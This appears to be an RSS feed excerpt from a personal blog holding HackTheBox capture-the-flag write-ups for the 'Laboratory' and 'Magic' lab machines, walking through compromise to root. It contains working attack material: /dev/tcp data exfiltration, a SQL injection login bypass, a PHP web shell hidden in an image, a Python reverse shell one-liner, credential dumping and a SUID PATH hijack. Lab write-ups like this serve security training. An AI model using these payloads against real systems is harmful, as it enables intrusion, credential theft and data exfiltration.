<span class="o">[</span>+<span class="o">]</span> Extracted secret_key_base 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
<span class="o">[</span>*<span class="o">]</span> NOTE: Setting the SECRET_KEY_BASE option with the above value will skip this arbitrary file <span class="nb">read</span>
<span class="o">[</span>*<span class="o">]</span> Attempting to delete project /iamf/hpt2TORA
<span class="o">[</span>*<span class="o">]</span> Deleted project /iamf/hpt2TORA
<span class="o">[</span>*<span class="o">]</span> Attempting to delete project /iamf/ysGE0u0L
<span class="o">[</span>*<span class="o">]</span> Deleted project /iamf/ysGE0u0L
<span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">1</span> opened <span class="o">(</span>10.10.14.39:9001 -&gt; 10.10.10.216:52726<span class="o">)</span> at 2021-03-21 17:46:14 -0400

id<span class="p">;</span>hostname
<span class="nv">uid</span><span class="o">=</span>998<span class="o">(</span>git<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>998<span class="o">(</span>git<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>998<span class="o">(</span>git<span class="o">)</span>
git.laboratory.htb
</code></pre></div><p>I have shell as user <code>git</code>.</p>
<p>There is a <code>.dockerenv</code> file in the root directory, which indicates that I&rsquo;m inside a docker container.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">ls -la /
total <span class="m">88</span>
drwxr-xr-x   <span class="m">1</span> root root <span class="m">4096</span> Jul  <span class="m">2</span>  <span class="m">2020</span> .
drwxr-xr-x   <span class="m">1</span> root root <span class="m">4096</span> Jul  <span class="m">2</span>  <span class="m">2020</span> ..
-rwxr-xr-x   <span class="m">1</span> root root    <span class="m">0</span> Jul  <span class="m">2</span>  <span class="m">2020</span> .dockerenv
-rw-r--r--   <span class="m">1</span> root root  <span class="m">157</span> Feb <span class="m">24</span>  <span class="m">2020</span> RELEASE
drwxr-xr-x   <span class="m">2</span> root root <span class="m">4096</span> Feb <span class="m">24</span>  <span class="m">2020</span> assets
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-dexter">Shell as dexter</h3>
<h4 id="container-enumeration">Container enumeration</h4>
<p>Enumerating the <code>git</code> home directory (<code>/var/opt/gitlab</code>) discovers two repositories that belongs to user <code>dexter</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">git@git:~$ grep -Ri dexter 2&gt;/dev/null

git-data/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git/config:        <span class="nv">fullpath</span> <span class="o">=</span> dexter/securedocker
git-data/repositories/@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3.git/config:        <span class="nv">fullpath</span> <span class="o">=</span> dexter/securewebsite
</code></pre></div><p>I haven&rsquo;t seen that <code>dexter/securedocker</code> before in the GitLab application. So I&rsquo;ll grab that repository and transfer it to my machine</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">git@git:~/git-data/repositories/@hashed/19/58$ ls -la 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git
total <span class="m">40</span>
drwxr-s---  <span class="m">6</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> .
drwxr-s---  <span class="m">4</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> ..
-rw-r--r--  <span class="m">1</span> git root   <span class="m">23</span> Jul  <span class="m">5</span>  <span class="m">2020</span> HEAD
-rw-r--r--  <span class="m">1</span> git root  <span class="m">107</span> Jul  <span class="m">5</span>  <span class="m">2020</span> config
-rw-r--r--  <span class="m">1</span> git root   <span class="m">73</span> Jul  <span class="m">5</span>  <span class="m">2020</span> description
drwxr-sr-x  <span class="m">2</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> hooks
drwxr-sr-x  <span class="m">2</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> info
-rw-r--r--  <span class="m">1</span> git root  <span class="m">112</span> Jul  <span class="m">5</span>  <span class="m">2020</span> language-stats.cache
drwxr-sr-x <span class="m">14</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> objects
drwxr-sr-x  <span class="m">4</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> refs
</code></pre></div><p>First, I’ll create a tarball archive of that repository and I’ll name it as <code>exfil-securedocker-git.tar</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">git@git:~/git-data/repositories/@hashed/19/58/$ tar -czf /tmp/exfil-securedocker-git.tar 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git
</code></pre></div><p>On my machine, I&rsquo;ll setup a listener</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «loot» «10.10.14.39»
$ nc -nvlp <span class="m">9000</span> &gt; exfil-securedocker-git.tar
</code></pre></div><p>Back on Laboratory, I’ll send the repository  tarball to my machine using <code>cat</code> and <code>bash</code> trick</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">git@git:~/git-data/repositories/@hashed/19/58/$ cat /tmp/exfil-securedocker-git.tar &gt; /dev/tcp/10.10.14.39/9000
</code></pre></div><p>My listener received the tarball.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «loot» «10.10.14.39»
$ nc -nvlp <span class="m">9000</span> &gt; exfil-securedocker-git.tar
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
connect to <span class="o">[</span>10.10.14.39<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.216<span class="o">]</span> <span class="m">42426</span>
</code></pre></div><h4 id="recovering-securedocker-repository">Recovering &lsquo;securedocker&rsquo; repository</h4>
<p>After extracting the repository,  <code>git:(master)</code> popped up in my zsh prompt which indicates this is a git repository.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «loot» «10.10.14.39»
$ tar -xzf exfil-securedocker-git.tar
→ root@iamf «loot» «10.10.14.39»
$ <span class="nb">cd</span> 19581e27de7ced....5ef03f7c3017bb5b7.git
→ root@iamf «19581e27de7ced....5ef03f7c3017bb5b7.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
$ 
</code></pre></div><p>But, when I try to read the repository status, it returns the following errors.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «19581e27de7ced....5ef03f7c3017bb5b7.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
$ git status
fatal: this operation must be run in a work tree
</code></pre></div><blockquote>
<p>I&rsquo;ve renamed <code>19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git</code> to <code>secure-docker.git</code>.</p>
</blockquote>
<p>This problem can be resolved by creating a new <code>.git</code> folder within <code>secure-docker.git</code> and transferring all the files from <code>secure-docker.git</code> to the newly created <code>.git</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
$ mkdir .git
→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
$ mv * .git
→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
$ git status
fatal: this operation must be run in a work tree
</code></pre></div><p>Finally, use the <code>git init</code> command to re-initialize the git repository.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
$ git init
Reinitialized existing Git repository in /root/htb/to-do/laboratory/loot/secure-docer.git/.git/
→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
$ git status
On branch master
Changes to be committed:
  <span class="o">(</span>use <span class="s2">&#34;git restore --staged &lt;file&gt;...&#34;</span> to unstage<span class="o">)</span>
        deleted:    README.md
        deleted:    create_gitlab.sh
        deleted:    dexter/.ssh/authorized_keys
        deleted:    dexter/.ssh/id_rsa
        deleted:    dexter/recipe.url
        deleted:    dexter/todo.txt
</code></pre></div><p>Interestingly, this repository contains a set of SSH keys. I can restore the deleted files with <code>git checkout --</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
$ git checkout --
→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
$ ls -la
total <span class="m">20</span>
drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> Mar <span class="m">22</span> 09:36 .
drwxr-xr-x <span class="m">4</span> root root <span class="m">4096</span> Mar <span class="m">22</span> 09:36 ..
-rw-r--r-- <span class="m">1</span> root root  <span class="m">102</span> Mar <span class="m">22</span> 09:36 recipe.url
drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Mar <span class="m">22</span> 09:36 .ssh
-rw-r--r-- <span class="m">1</span> root root  <span class="m">160</span> Mar <span class="m">22</span> 09:36 todo.txt
</code></pre></div><h4 id="ssh---dexter">SSH - dexter</h4>
<p>I can now login as <code>dexter</code> using the SSH key I obtained.</p>
<p>At first try, it says the key is invalid format.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
$ chmod <span class="m">600</span> dexter/.ssh/id_rsa
→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
$ ssh -i dexter/.ssh/id_rsa dexter@10.10.10.216
Load key <span class="s2">&#34;id_rsa&#34;</span>: invalid format
dexter@10.10.10.216: Permission denied <span class="o">(</span>publickey<span class="o">)</span>.
</code></pre></div><p>I fixed that by adding an empty string using the <code>echo</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
$ <span class="nb">echo</span> <span class="s1">&#39;&#39;</span> &gt;&gt; dexter/.ssh/id_rsa
</code></pre></div><p>Now it logs me in.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
$ ssh -i id_rsa dexter@10.10.10.216
dexter@laboratory:~$
dexter@laboratory:~$ id<span class="p">;</span>hostname
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>dexter<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>dexter<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>dexter<span class="o">)</span>
laboratory
dexter@laboratory:~$ ls -l
total <span class="m">4</span>
-r--r----- <span class="m">1</span> root dexter <span class="m">33</span> Mar <span class="m">22</span> 10:06 user.txt
</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>The contents of <code>todo.txt</code> talks something about “docker security”, but I have no idea what it is except it uses three hashtags.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
$ cat dexter/todo.txt
<span class="c1"># DONE: Secure docker for regular users</span>
<span class="c1">### DONE: Automate docker security on startup</span>
<span class="c1"># TODO: Look into &#34;docker compose&#34;</span>
<span class="c1"># TODO: Permanently ban DeeDee from lab#</span>
</code></pre></div><p>It turns out it’s a binary name which has a SUID bit set found by Linpeas.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">...&lt;SNIP&gt;...
════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════

<span class="o">[</span>+<span class="o">]</span> SUID - Check easy privesc, exploits and write perms                                                                                
-rwsr-xr-x <span class="m">1</span> root   dexter           17K Aug <span class="m">28</span>  <span class="m">2020</span> /usr/local/bin/docker-security
</code></pre></div><p>Inspecting the binary with the <code>ltrace</code> command finds out that it uses relative path to call <code>chmod</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">dexter@laboratory:~$ ltrace docker-security 

setuid<span class="o">(</span>0<span class="o">)</span>                                                                                                <span class="o">=</span> -1
setgid<span class="o">(</span>0<span class="o">)</span>                                                                                                <span class="o">=</span> -1
system<span class="o">(</span><span class="s2">&#34;chmod 700 /usr/bin/docker&#34;</span>chmod: changing permissions of <span class="s1">&#39;/usr/bin/docker&#39;</span>: Operation not permitted
 &lt;no <span class="k">return</span> ...&gt;
--- SIGCHLD <span class="o">(</span>Child exited<span class="o">)</span> ---
&lt;... system resumed&gt; <span class="o">)</span>                                                                                   <span class="o">=</span> <span class="m">256</span>
system<span class="o">(</span><span class="s2">&#34;chmod 660 /var/run/docker.sock&#34;</span>chmod: changing permissions of <span class="s1">&#39;/var/run/docker.sock&#39;</span>: Operation not permitted
 &lt;no <span class="k">return</span> ...&gt;
--- SIGCHLD <span class="o">(</span>Child exited<span class="o">)</span> ---
&lt;... system resumed&gt; <span class="o">)</span>                                                                                   <span class="o">=</span> <span class="m">256</span>
+++ exited <span class="o">(</span>status 0<span class="o">)</span> +++
</code></pre></div><p>Knowing this, I could hijack the execution path.</p>
<h4 id="suid---path-hijack">SUID - Path Hijack</h4>
<p>First, I&rsquo;ll create a fake <code>chmod</code> that calls <code>bash</code> binary at <code>/dev/shm</code>, I&rsquo;ll also add an execute permission on that file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">dexter@laboratory:~$ <span class="nb">cd</span> /dev/shm
dexter@laboratory:/dev/shm$ <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/bash\n/bin/bash&#39;</span> &gt; chmod
dexter@laboratory:/dev/shm$
dexter@laboratory:/dev/shm$ /bin/chmod +x chmod
</code></pre></div><p>Next, I&rsquo;ll add current directory (<code>/dev/shm</code>) to <code>$PATH</code> variable. Now if I call <code>chmod</code>, it will point to my <code>chmod</code> on <code>/dev/shm</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">dexter@laboratory:/dev/shm$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span>:<span class="nv">$PATH</span>
dexter@laboratory:/dev/shm$
dexter@laboratory:/dev/shm$ which chmod
/dev/shm/chmod
</code></pre></div><p>And now I can just execute <code>docker-security</code> to obtain a root access as well as the root flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">dexter@laboratory:/dev/shm$ docker-security 
root@laboratory:/dev/shm#
root@laboratory:/dev/shm# cut -c6- /root/root.txt 
9f593f335a0a1f403c753719eb6
</code></pre></div><hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://hackerone.com/reports/827052">https://hackerone.com/reports/827052</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Magic</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-magic/</link>
      <pubDate>Fri, 09 Apr 2021 13:32:05 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-magic/</guid>
      <description>Magic machine from HackTheBox</description>
      <content:encoded><![CDATA[<p>Magic is a medium difficulty Linux machine from HackTheBox that features a php-based web application which is vulnerable to SQL injection for login bypass. The application upload feature has an upload filter that can be bypassed by embedding a web shell payload to a valid image file and adding a php extension to it. With that web shell, I&rsquo;m able to gain a foothold on the system and use database credentials to dump admin password that is reused by a user on the box. For the root part, there&rsquo;s a SUID binary that calls other binaries without their absolute path. This allows me to perform a path hijack attack and gain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>SQL injection</li>
<li>Bypassing Upload Filter</li>
<li>SUID exploitation</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>Exiftool - <a href="https://exiftool.org/">https://exiftool.org/</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «magic» «10.10.14.169»
$ nmap -sC -sV -oA scans/magic 10.10.10.185

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey:
<span class="p">|</span>   <span class="m">2048</span> 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
<span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
<span class="p">|</span>_http-title: Magic Portfolio
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div><p><code>nmap</code> found two ports open, an HTTP service on port 80 and SSH service on port 22</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80  -  Website</h3>
<p>The home page shows a bunch of images.</p>
<p><img src="imgs/image-20210413132328926.png" alt="image-20210413132328926" style="zoom:80%;" /></p>
<p>By clicking &ldquo;Views image&rdquo;, I know some images located on <code>/images/uploads</code> and some others on <code>/images/fulls</code>. At the bottom page, there&rsquo;s a login button that points to <code>/login.php</code></p>
<p><img src="imgs/image-20210412052815532.png" alt="image-20210412052815532" style="zoom: 80%;" /></p>
<p>Common credentials don&rsquo;t seem to work here.</p>
<h4 id="sql-injection---login-bypass-on-loginphp">SQL injection - Login bypass on <code>/login.php</code></h4>
<blockquote>
<p>The login form doesn&rsquo;t allows spacing between character, but it can be tricked by copy and paste.</p>
</blockquote>
<p>A basic sql injection technique <code>' or 1 = 1 -- - </code>  to bypass login is work against the login page.</p>
<blockquote>
<p>In MySQL, a space after a comment is a must <code>-- [space]</code>, because of that I added <code>-- -</code> to make it clear.</p>
</blockquote>
<p>We can assume the back-end query would look like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="p">...</span><span class="o">&lt;</span><span class="k">some</span><span class="w"> </span><span class="n">php</span><span class="o">&gt;</span><span class="p">...</span><span class="w">
</span><span class="w"></span><span class="err">$</span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span><span class="w">
</span><span class="w"></span><span class="err">$</span><span class="n">pwd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span><span class="w">
</span><span class="w"></span><span class="p">...</span><span class="o">&lt;</span><span class="k">some</span><span class="w"> </span><span class="n">php</span><span class="o">&gt;</span><span class="p">...</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">table</span><span class="p">.</span><span class="k">user</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;$username&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s1">&#39;$pwd&#39;</span><span class="w">
</span></code></pre></div><p>If I assign <code>' or 1 = 1 -- - </code> as value of <code>$username</code>, it becomes:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">table</span><span class="p">.</span><span class="k">user</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="c1">-- -&#39; and password=&#39;$pwd&#39;
</span></code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="upload-filter-bypass">Upload filter bypass</h4>
<p>Upon a successful login, the site redirects me to <code>/upload.php</code>. It shows up with an upload form. It only accepts a valid image file.</p>
<p><img src="imgs/image-20210413153556151.png" alt="image-20210413153556151" style="zoom:80%;" /></p>
<p>After some testing, I can bypass this upload filter by embedding my php shell on an image file (I took it from the web itself). This can be done by using <code>exiftools</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «forest» «10.10.14.169»
$ ./exiftool -Comment<span class="o">=</span><span class="s1">&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span> iamf.jpg
</code></pre></div><p>Next, I added <code>.php</code> extension right before the image extension (in my case it is <code>.jpg</code>, so it becomes <code>filename.php.jpg</code>).</p>
<p>Back to <code>/upload.php</code>, now it accepts my php embedded image.</p>
<p><img src="imgs/image-20210413153504323.png" alt="image-20210413153504323" style="zoom:80%;" /></p>
<p>I can find the uploaded file at <code>http://htb.magic/images/uploads/</code>.</p>
<p>When I visit <code>http://htb.magic/images/uploads/iamf.php.jpg?cmd=pwd</code>, I can see the code execution is working</p>
<p><img src="https://cdn-images-1.medium.com/max/1000/1*WJEvgyrM5UmXULt8uBhu3A.png" alt="img" style="zoom:80%;" /></p>
<h4 id="shell-access">Shell access</h4>
<p>The machine has Python3 installed. With that, I can send a Python one liner reverse shell and set up a listener on port 443 to gain a foothold on the system.</p>
<p>I&rsquo;ll enter this URL on the browser.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">http://htb.magic/images/uploads/iamf.php.jpg?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.169%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27&#34;
</span></code></pre></div><p>Now on my listener, it caught the shell</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «magic» «10.10.14.169»
$ nc -nvlp <span class="m">443</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> ...
connect to <span class="o">[</span>10.10.14.169<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.185<span class="o">]</span> <span class="m">19448</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1327<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
$ id
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-theseus">Shell as theseus</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>I discovered a database configuration <code>db.php5</code> that stores credentials after enumerating the current working directory with the find command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ find . -type f -user www-data

...&lt;SNIP&gt;...
./var/www/Magic/db.php5
...&lt;SNIP&gt;...
</code></pre></div><p><img src="imgs/image-20210413153535228.png" alt="image-20210413153535228" style="zoom:80%;" /></p>
<h4 id="database-dump">Database dump</h4>
<p>I can use <code>netstat</code> to confirm that the MySQL server is currently running.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@ubuntu:/var/www/Magic$ netstat -tlpn

...&lt;SNIP&gt;...
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
...&lt;SNIP&gt;...
tcp		0		<span class="m">0</span>   127.0.0.1:3306           0.0.0.0:*              LISTEN       -
...&lt;SNIP&gt;...
</code></pre></div><p>Unfortunately, <code>mysql</code> binary is not present in the box.</p>
<p><img src="imgs/image-20210413153425371.png" alt="image-20210413153425371" style="zoom:67%;" /></p>
<p>Instead, I could use <code>mysqldump</code> to dump the database.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@ubuntu:/var/www/Magic$ mysqldump Magic -u theseus -p<span class="s1">&#39;iamkingtheseus&#39;</span>

...&lt;SNIP&gt;...
LOCK TABLES <span class="sb">`</span>login<span class="sb">`</span> WRITE<span class="p">;</span>
/*!40000 ALTER TABLE <span class="sb">`</span>login<span class="sb">`</span> DISABLE KEYS */<span class="p">;</span>
INSERT INTO <span class="sb">`</span>login<span class="sb">`</span> VALUES <span class="o">(</span>1,<span class="s1">&#39;admin&#39;</span>,<span class="s1">&#39;Th3s3usW4sK1ng&#39;</span><span class="o">)</span><span class="p">;</span>
/*!40000 ALTER TABLE <span class="sb">`</span>login<span class="sb">`</span> ENABLE KEYS */<span class="p">;</span>
UNLOCK TABLES<span class="p">;</span>                                           
/*!40103 SET <span class="nv">TIME_ZONE</span><span class="o">=</span>@OLD_TIME_ZONE */<span class="p">;</span>
...&lt;SNIP&gt;...
</code></pre></div><h4 id="shell-upgrade-to-ssh">Shell upgrade to SSH</h4>
<p>The password is reused by user <code>theseus</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@ubuntu:/var/www/Magic$ su theseus
Password: 
theseus@ubuntu:/var/www/Magic$
</code></pre></div><p>Before enumeration, I would like to switch to SSH. First, I&rsquo;ll generate a new ssh key.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «magic» «10.10.14.169»
$ ssh-keygen -f theseus 
</code></pre></div><p>Then, I&rsquo;ll add the newly generated public key to <code>theseus</code>&rsquo;s <code>authorized_keys</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">theseus@ubuntu:~/.ssh$ <span class="nb">echo</span> <span class="s1">&#39;ssh-rsa AAABBBCCCDDD&#39;</span> &gt;&gt; authorized_keys
</code></pre></div><p>Now I can log in via SSH.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «magic» «10.10.14.169»
$ ssh -i  theseus@10.10.10.185
...&lt;SNIP&gt;...
theseus@ubuntu:~$ id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>theseus<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>theseus<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>100<span class="o">(</span>users<span class="o">)</span>,1000<span class="o">(</span>theseus<span class="o">)</span>
</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>Upon enumerating for SUID, there&rsquo;s a binary that doesn&rsquo;t seem a common SUID on Ubuntu.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">theseus@ubuntu:~$ find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
</code></pre></div><p><img src="imgs/image-20210413153352652.png" alt="image-20210413153352652" style="zoom: 67%;" /></p>
<p>The <code>sysinfo</code> binary is owned by root, but it can be executed by the <code>users</code> group and  <code>theseus</code> is a member of that group.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">theseus@ubuntu:~$ ls -las /bin <span class="p">|</span> grep sysinfo
 <span class="m">24</span> -rwsr-x--- <span class="m">1</span> root users <span class="m">22040</span> Oct <span class="m">21</span> <span class="m">2019</span> sysinfo
</code></pre></div><p>I executed the binary and it returns some hardware information on screen that looks similar to <code>lshw</code>, <code>free</code> and other binary related to hardware info. A quick search on Google shows this:</p>
<p><img src="imgs/image-20210413153328164.png" alt="image-20210413153328164" style="zoom:80%;" /></p>
<p>It is the same header.</p>
<p><img src="imgs/image-20210413153311827.png" alt="image-20210413153311827" style="zoom:80%;" /></p>
